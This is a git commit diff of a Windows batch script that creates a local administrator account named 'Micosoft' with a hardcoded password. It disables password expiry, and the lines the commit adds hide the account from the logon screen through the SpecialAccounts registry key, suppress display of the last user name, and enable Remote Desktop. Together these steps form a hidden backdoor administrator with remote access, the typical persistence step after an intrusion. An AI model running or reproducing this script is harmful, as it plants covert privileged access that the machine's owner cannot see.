d7736e5fb49d1bef7eb43f4101a48917200ad230
Slivak_win11 <eas1804@gmail.com>
2024-03-11 15:47:28 +0200

    cmd cyr win 2

--- Windows/Scrypts/Add_user_admin_eng.cmd
+++ Windows/Scrypts/Add_user_admin_eng.cmd
@@ -1,14 +1,14 @@
-chcp 1251
 @echo off
 set NEW_USER=Micosoft
 set NEW_PASS=Samsung1!
 
-
+chcp 1251
 net user %NEW_USER% %NEW_PASS% /add
 wmic path Win32_UserAccount where Name="%NEW_USER%" set PasswordExpires=false
 net user %NEW_USER% /logonpasswordchg:no
-REM Добавление пользователя в группу "Администраторы"
-net localgroup Администраторы %NEW_USER% /add
-
+net localgroup administrators %NEW_USER% /add
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLastName /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %NEW_USER% /t reg_dword /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
 pause
